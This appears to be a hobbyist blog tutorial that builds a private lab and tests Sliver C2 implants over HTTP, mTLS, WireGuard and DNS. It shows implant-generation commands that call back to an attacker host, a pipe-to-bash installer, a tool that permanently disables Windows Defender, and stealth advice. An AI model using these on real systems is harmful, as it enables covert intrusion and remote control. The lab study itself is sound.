---
title: "🧑‍💻Learning C2 with Sliver🛰️"
date: 2026-01-15T14:22:03+00:00
summary: "hi guys, I hope everyone is still goin strong with their new year resolutions 😀"
draft: false
---


## introduction

hi guys, I hope everyone is still goin strong with their new year resolutions 😀

in this blog we will be looking at how actual command and control works by setting up and playing with a realistic(ish) environment. I will be using [sliver](https://sliver.sh/) as an example but [havoc](https://havocframework.com/) and [GunnerC2](https://github.com/LeighlinRamsay/GunnerC2) are great open source alternatives.

![nerd](/exploring-c2/nerd-4.png)

![sliver](/exploring-c2/sliver.png)
you can also explore some other open source ones [here](https://github.com/killvxk/awesome-C2)

## installation

installing sliver is very easy, just use the following one liner to install it

```bash
curl https://sliver.sh/install|sudo bash
```

![sliver](/exploring-c2/sliver-initial.png)

## implants: sessions vs beacons

okay, so lets begin by discussing the basic but very important concept of implants and the two types of implants: session implants and beacon implants.

#### what are implants?

implants are malicious payloads that are executed on a targeted system in order to establish a connection from the victim to the c2 server. Once the connection is established, it can be used for further enumeration or code execution. Think of msfvenom payloads to generate a reverse shell.
![implants](/exploring-c2/implants.png)

#### session implants

these are implants which establish a session with the c2 server when executed. This way, the response you get is immediate (similar to having SSH access to the victim). The major downside is that these generate noise, are not very stealthy and tend to get caught easily with any halfway decent IDS/IPS mechanism.

sliver command:

```bash
generate --mtls <your_server_ip> --os <target_os> --arch <target_architecture>
```

#### beacon implants

these implants do not establish a session with the c2 server and instead do “polling” where they periodically activate, check if there are any new commands in the queue, execute them and then go back to sleep for a certain period. Beacons are much more stealthy than sessions and can be made even stealtier by adding jitter (random check in periods) to throw off IDS/IPS looking for patterns in network traffic. The major downside here is that commands will not get executed immediately but are placed in a “queue” and wait to be executed the next time the beacon does “polling”

sliver command:

```bash
generate beacon --mtls <your_server_ip> --os <target_os> --arch <target_architecture> --seconds 5 --jitter 3
```

## setting up the lab

#### victim

alright, now lets set up our victim machine. This time, we will be using an x64 windows 11 machine as our victim with windows defender turned completely off because we dont want to deal with any kind of AV evasion techniques right now. I also put a nice background on our victim.
![victim](/exploring-c2/vicitm.png)

#### how to turn off defender on windows?

surprisingly, this was really difficult to do! windows automatically turns on windows defender after 15-30 minutes or after a reboot when turned off manually.

I did not have any success by disabling it via group policy and [winaero tweaker](https://winaerotweaker.com/) did not work either.

finally, this github script called [“defendnot”](https://github.com/es3n1n/defendnot) disabled defender permanently.

![defender-status](/exploring-c2/defender-status.png)

#### DNS server

now we need our own dns server which will have A records for our attacker: `c2.lab.local` and the c2 domain through which we will execute commands: `dnsc2.lab.local` both of which will point to my attacker IP `192.168.17.128`

note that in real life, your c2 will be controlled through an actual registered domain available globally on the internet. Here are some interesting ones I found:

```bash
- bookcutsmall[.]top
- bookhappenhappy[.]top
- 3322[.]org
- tonguepunchfartbox[.]life
- kasprsky[.]info
- onedrivesync[.]com
- mocrosoft[.]cf
...
```

lets create a DNS server for our lab

first, setup a normal debian VM by downloading the image [here](https://www.debian.org/CD/). Then, install [named/BIND](https://en.wikipedia.org/wiki/BIND)

```bash
apt-get install bind9 bind9utils bind9-doc
```

second, add the following to `/etc/bind/named.conf.options` (`192.168.17.132` is the ip of our DNS server) and queries with no records on this server will be forwarded to `8.8.4.4` or `8.8.8.8` which are google’s DNS servers.

```bash
acl "localnet" {
        192.168.17.0/24;
};

options {
        directory "/var/cache/bind";

        recursion yes;                     # resursive queries
        allow-recursion { localnet; };     # recursive queries

        listen-on { 192.168.17.132; };    # IP address of the DNS server
        allow-transfer { none; };          # disable zone transfers

        forwarders {
                8.8.8.8;
                8.8.4.4;
        };

        dnssec-validation auto;

        listen-on-v6 { any; };
};

logging {
        channel query {
            file "/var/log/bind/query" versions 5 size 10M;
            print-time yes;
            severity info;
        };

        category queries { query; };
};
```

third, create the following directory, chown it and whitelist it on AppArmor

```bash
mkdir -p /var/log/bind
chown bind /var/log/bind
```

edit `/etc/apparmor.d/usr.sbin.named` to

```bash
profile named /usr/sbin/named flags=(attach_disconnected) {
  ...
  /var/log/bind/** rw,
  /var/log/bind/ rw,
  ...
}
```

```bash
systemctl restart apparmor
```

fourth, lets do the zone file configuration

```bash
mkdir -p /etc/bind/zones
```

edit `/etc/bind/named.conf.local`

```bash
//
// Do any local configuration here
//
zone "lab.local" {
    type master;
    file "/etc/bind/zones/db.lab.local"; 
    forwarders {};
  # zone file path
};

zone "17.168.192.in-addr.arpa" {
    type master;
    file "/etc/bind/zones/db.17.168.192";    # 192.168.17.0/24
};
```

fifth, create the zone files (forward and reverse)
file `/etc/bind/zones/db.lab.local`

```bash
$TTL    604800
@       IN      SOA     ns.lab.local. admin.lab.local. (
                              4         ; Serial
                         604800         ; Refresh
                          86400         ; Retry
                        2419200         ; Expire
                         604800 )       ; Negative Cache TTL

; name servers - NS records
    IN      NS      ns.lab.local.

; name servers - A records
ns.lab.local.          IN      A       192.168.17.132

; 192.168.17.0/24 - A records
victim.lab.local.        IN      A      192.168.17.130
c2.lab.local.        IN      A      192.168.17.128
dnsc2.lab.local.		360     IN      NS      c2.lab.local.
```

and file `/etc/bind/zones/db.17.168.192`

```bash
$TTL    604800
@       IN      SOA     ns.lab.local. admin.lab.local. (
                              4         ; Serial
                         604800         ; Refresh
                          86400         ; Retry
                        2419200         ; Expire
                         604800 )       ; Negative Cache TTL

; name servers
      IN      NS      ns.lab.local.

; PTR Records
105   IN      PTR     ns.lab.local.        ; 192.168.17.132
160   IN      PTR     victim.lab.local.    ; 192.168.17.130
111   IN      PTR     c2.lab.local.    ; 192.168.17.128
```

alright, now finally restart the service

```bash
systemctl restart bind9
```

lets test if our DNS server works

on attacker,

```bash
dig +short @192.168.17.132 victim.lab.local
```

![dns server](/exploring-c2/dns-kali.png)

on the victim, we need to change the default DNS server to `192.168.17.132`

finally, checking the DNS server logs, we can see its working!

```bash
cat /var/log/bind/query
```

![dns-log](/exploring-c2/dns-logs.png)

Finally, this is how our final lab configuration looks like:

```bash
attacker -> 192.168.17.128
victim -> 192.168.17.130
DNS server -> 192.168.17.132
```

**Now we can finally start exploring C2**

## HTTP(S)

As the name suggests, an HTTP implant will use HTTP/S to communicate with the c2 server and execute commands.

With our lab setup ready, lets generate an http implant on sliver

```bash
generate --http 192.168.17.128 --os windows --arch amd64 --format exe
```

![http-implant](/exploring-c2/http-implant.png)

once generated, we can transfer it to our victitm using an http server
![http-implant-download](/exploring-c2/http-implant-download.png)

after starting an http listener and executing the implant on the victim, we see a connection back to our c2!

![http-connection](/exploring-c2/http-connection.png)

now looking at wireshark, heres what we can see the http traffic flowing
![http-wireshark](/exploring-c2/http-wireshark.png)

![http-wireshark-2](/exploring-c2/http-wireshark-2.png)

we can notice that the POST requests being made are to random endpoints so that they dont raise any eyebrows and the traffic itself is encrypted by sliver by default.

an upside for using http(s) implants is that they blend with normal traffic really well and if you can follow certain guidelines that we discuss later, the malicious traffic can become almost impossible to distinguish from legitimate traffic.

## mTLS

mutual TLS (mTLS) is also another way of communicating with our c2. In normal TLS used in HTTPS, a target server needs to provide a certificate to the user in order to prove its identity. This certificate is generally granted by a third-party (called a certificate authority). mTLS ensures that the client also has to present a certificate to the server to prove its identity. The identification process is “mutual” hence the name: mutual TLS.

sliver by default takes care of the certificates by putting them in the implant binary at the time of payload generation so we dont need to worry about them

similar to the http implant, we will now create an mTLS implant in sliver

```bash
generate --os windows --arch amd64 --format exe --mtls c2.lab.local,192.168.17.128
```

here we provide the c2 domain as well as the IP for fallback in case the DNS server does not resolve our c2 domain.

after generation, we deliver the payload to the victim windows machine and execute it as we did in the previous section.

we get a session on sliver!
![mtls-implant](/exploring-c2/mtls-implant.png)

and immediately, this is what we see on wireshark
![mtls-wireshark](/exploring-c2/mtls-wireshark.png)

first, a DNS request is sent to the DNS server to get the IP for `c2.lab.local`. Once the DNS server replies, a TCP handshake is initiated and then mTLS handshake takes place exchanging certificates and then the real traffic starts flowing. Amazing!

![gif](/exploring-c2/the-weeknd.gif)

ofcourse, all data is encrypted as before.
![mtls-wireshark-2](/exploring-c2/mtls-wireshark-2.png)

mTLS is a great way to do C2 communication however, it has a couple of issues

- mTLS is not that common so it cant blend that well with normal traffic and so it can be flagged by the blue team
- the certs are burned into the implant binary and cannot be changed at a later date so in case the c2 domain gets taken down, the whole campaign is at risk

## WireGuard

[wireguard](https://www.wireguard.com/) is a VPN techology that creates an encrypted channel between the victim and attacker for easy c2 communication. sliver also supports wireguard.

lets create a wireguard implant using sliver. We will try a **beacon** implant this time.

```bash
generate beacon --os windows --arch amd64 --format exe --seconds 5 --wg c2.lab.local,192.168.17.128
// --wg -> wireguard
// --seconds -> time interval for beacon polling
```

![wg-implant](/exploring-c2/wg-implant.png)

then same as before, deliver implant and execute…..
and get a connection back on sliver
![wg-implant-shell](/exploring-c2/wg-implant-shell.png)

This time since we have a beacon, we cannot launch an interactive shell (technically we can by using “interactive” command to convert beacon into session but that defeats the purpose of a beacon)

observe that command outputs are not immediate but are queued and executed next time the beacon checks in (max 5 seconds in our case)
![wg-beacon](/exploring-c2/wg-beacon.png)

lets look at the wireshark output now

![wg-wireshark](/exploring-c2/wg-wireshark.png)
since my version of wireshark does not support wireguard traffic, it looks like broken DNS traffic since its on UDP port 53. Newer version of wireshark have support for wirguard.

Nevertheless, we can identify that this is indeed wireguard traffic because it is between `192.168.17.128` (c2) and `192.168.17.130` (victim) and not the actual DNS server in our environment (`192.168.17.132`)

since wireguard is not a very common protocol in enterprise environments, it might be overlooked but at the same time it is easily identifiable. Also, many orgs automatically block outbound UDP entirely hence blocking wireguard.

## DNS

now lets talk about DNS c2 which is a really popular form of c2 since some orgs dont monitor DNS traffic at all making it very simple to have a c2 channel over DNS also, since a lot of DNS calls are made, it easy to blend in the legitimate traffic. The way it works is that sliver acts as the authoritative DNS server for our domain that we setup earlier (`dnsc2.lab.local`), the communication occurs through DNS queries and responses encoded with payloads.

Whenever the implant wants to send data, it will encode it into a string, say `str` and then do a DNS query to `str.dnsc2.lab.local` which can be decoded by the c2. When the c2 sever wants to send data, the implant does a `TXT` query and the server responds with some data in the `TXT` query.

sliver supports DNS c2 as well. Lets generate a DNS beacon implant

```bash
generate beacon --dns dnsc2.lab.local --seconds 5 --jitter 0
```

![dns-beacon-generate](/exploring-c2/dns-beacon-generate.png)

now we need to setup a listener (the format is a bit different for DNS)

```bash
dns -d dnsc2.lab.local
```

now after running the payload binary on the victim, we get a heart beat
![dns-connection](/exploring-c2/dns-connection.png)
![pulse](/exploring-c2/pulse.gif)
and this is what it looks like on wireshark
![dns-wireshark](/exploring-c2/dns-wireshark.png)
![dns-wireshark-2](/exploring-c2/dns-wireshark-2.png)
![dns-raw](/exploring-c2/dns-raw.png)
we can clearly make out, the victim reaches out the DNS server which redirects it to the authoritative name server for `dnsc2.lab.local` which is our attacker machine. Normal communication then occurs through encoding data in DNS queries and responses (eg. `baa8.dnsc2.lab.local`)

Keep in mind that since DNS is based on UDP, it does not guarantee proper communication and also, the maximum data that can be encoded in a DNS query is only `63` bytes [(rfc 1035)](https://ynitta.com/lec/dns/rfc/rfc1035.html), this method is quite slow.

## conclusion

![tldr](/exploring-c2/tldr.gif)
so after trying out all these different methods for command and control, which one is the best? well it depends:

- if you want to have max stealth in an enterprise environment: http(s) is the way to go
- for strong client auth and trust: mTLS is great
- if everything is locked down and you dont care about being flagged: DNS is amazing

turns out HTTP/S is still the king for c2 because of its versitality and its ability to blend in with normal traffic. If you manage to mimic real HTTP/S traffic coming from a legitimate application and follow RFC standards, it becomes very difficult to identify malicious traffic from legitimate one.

this line by ChatGPT goes harddd:

> *The most resilient modern C2 isn’t exotic—it’s boring HTTPS with excellent mimicry and discipline. Weird C2 shines briefly, then burns hard.*
> *~ChatGPT*

## future endeavours

![future](/exploring-c2/future.gif)
thanks a lot for reading my article. I am really learning a lot by creating my own labs, doing stuff and writing blogs on it.

here are my plans for future c2 related blogs:

- try to identify, analyze and create alerts for c2 traffic on popular blue team tools like suricata
- try creative ways of doing c2 like discord, github, email and maybe youtube

stay tuned for my upcoming blogs!

---
